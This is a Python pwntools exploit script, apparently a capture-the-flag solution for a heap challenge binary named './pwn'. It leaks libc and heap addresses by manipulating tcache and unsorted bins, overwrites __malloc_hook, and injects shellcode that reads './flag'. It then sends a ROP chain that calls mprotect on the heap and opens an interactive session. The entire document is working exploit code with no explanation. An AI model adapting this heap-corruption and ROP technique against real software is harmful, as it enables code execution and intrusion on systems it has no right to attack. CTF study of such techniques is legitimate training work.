from pwn import *
context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch='amd64'
def cmd(c):
    p.sendlineafter("> ",str(c))
def add(idx,size,c="A"):
    cmd(1)
    p.sendlineafter(": ",str(idx))
    p.sendafter(": ",c.ljust(size,'\0'))
def edit(idx,c):
    cmd(2) 
    p.sendlineafter(": ",str(idx))
    p.sendafter(": ",c)
def show(idx):
    cmd(3)
    p.sendlineafter(": ",str(idx))
def free(idx):
    cmd(4)
    p.sendlineafter(": ",str(idx))

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
p=process("./pwn")
#p=remote("buuoj.cn",25327)
for x in range(6):
    add(0,0x88)
    free(0)
for x in range(7):
    add(0,0x288,"n132")
    free(0)
add(0,0x288)
add(1,0x99)
free(0)
show(0)
p.readuntil("name: ")
base=u64(p.read(6)+'\0\0')-libc.sym['__malloc_hook']-0x70
libc.address=base

add(0,0x1f8)
free(0)
free(1)
add(0,0x288)
add(1,0x99)
free(0)
add(2,0x1f8)
free(2)
show(2)
p.readuntil("name: ")
heap=u64(p.read(6)+'\0\0')-0x17b0
add(2,0x217)
free(2)
edit(2,p64(libc.sym['__malloc_hook']))
edit(0,'\0'*0x1f8+p64(0x91)+p64(heap+0x19a0)+p64(heap+0x30-0x10))
log.warning(hex(heap))
log.warning(hex(base))
add(1,0x88)
cmd(0xc388)
sh=shellcraft.open("./flag")
sh+='''
mov rdi,rax
mov rsi,{}
mov rdx,0x30
xor rax,rax
syscall
mov rdi,1
mov rax,1
syscall
'''.format(heap+0x800)
p.send(asm(sh))
cmd(0xc388)
gadget=0x000000000010e994+base#add rsp,0x58;ret;
rdi=0x0000000000026542+base
gdb.attach(p)
p.send(p64(gadget))
ret=0x000000000002535f+base
rdi=0x0000000000026542+base
rsi=0x0000000000026f9e+base
rdx=0x000000000012bda6+base
rax=0x0000000000047cf8+base
sys=0x0000000000026bd4+base
rcx=0x000000000010b31e+base
rop=p64(ret)*3+p64(rdi)+p64(0xa)+p64(rsi)+p64(heap)+p64(rdx)+p64(0x3000)+p64(rcx)+p64(7)+p64(libc.sym['syscall'])+p64(heap+0x1e30)
add(0,0x200,rop)
p.interactive()
